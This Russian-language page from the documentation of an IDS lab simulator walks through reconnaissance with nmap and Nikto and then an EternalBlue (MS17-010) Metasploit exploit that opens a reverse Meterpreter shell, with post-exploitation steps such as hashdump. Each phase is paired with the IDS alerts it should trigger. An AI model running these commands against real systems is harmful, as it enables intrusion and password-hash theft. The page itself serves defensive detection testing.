# Сценарии атак

Этот раздел содержит подробное описание всех атак, используемых в симуляторе, и их ожидаемые результаты в IDS.

## Общая схема атак

```
Kali Linux (192.168.10.10) --> [DMZ] --> [LAN] --> Windows (192.168.20.10)
                                                        ^
                                              ViPNet IDS NS VA
                                            (мониторит SPAN)
```

## Фаза 1. Разведка (Reconnaissance)

### 1.1 SYN-сканирование портов

```bash
nmap -sS -p- 192.168.20.10
```

### 1.2 Определение версий служб

```bash
nmap -sV -O 192.168.20.10
```

### 1.3 Агрессивное сканирование

```bash
nmap -A -T4 192.168.20.10
```

**Ожидаемая реакция IDS:** Nmap SYN Scan — `INFO: Network Scanning`

## Фаза 2. Анализ уязвимостей

### 2.1 Веб-сканирование (Nikto)

```bash
nikto -h http://192.168.20.10
```

### 2.2 Анализ SMB через Nmap NSE

```bash
nmap --script smb-vuln* -p 445 192.168.20.10
```

### 2.3 Поиск EternalBlue (MS17-010)

```bash
nmap --script smb-vuln-ms17-010 -p 445 192.168.20.10
```

**Ожидаемая реакция IDS:** `WARNING: SMB Enumeration`, `WARNING: Reconnaissance`

## Фаза 3. Эксплуатация (Exploitation)

### 3.1 Запуск Metasploit Framework

```bash
msfconsole
```

### 3.2 Использование MS17-010 EternalBlue

```
# Поиск эксплойта
search ms17-010

# Выбор эксплойта
use exploit/windows/smb/ms17_010_eternalblue

# Настройка параметров
set RHOSTS 192.168.20.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.10.10

# Запуск
exploit
```

**Ожидаемая реакция IDS:** `CRITICAL: MS17-010 Exploit`, `CRITICAL: Meterpreter Session`

### 3.3 Пост-эксплуатация (Meterpreter)

```
sysinfo         # Информация о системе
getuid          # Текущий пользователь
ps              # Список процессов
screenshot      # Снимок экрана
hashdump        # Дамп хэшей паролей
```

## Мониторинг IDS во время атак

| Фаза | Тип события | Ожидаемый уровень |
|-------|----------------|-------------------|
| Разведка | Network Scanning | INFO |
| Анализ SMB | SMB Enumeration | WARNING |
| MS17-010 скан | MS17-010 Detect | WARNING |
| Эксплуатация | Exploitation | CRITICAL |
| Meterpreter | System Compromise | CRITICAL |

## Оценка эффективности IDS

После проведения всех атак заполните таблицу:

| Метрика | Значение |
|---------|----------|
| True Positives (TP) | |
| False Positives (FP) | |
| False Negatives (FN) | |
| Precision = TP/(TP+FP) | |
| Recall = TP/(TP+FN) | |

## Дополнительные сценарии

В будущем можно добавить:

- `brute-force.md` — атаки подбора пароля
- `web-attacks.md` — SQL-инъекции, XSS, Path Traversal
- `malware-simulation.md` — симуляция вредоносного ПО
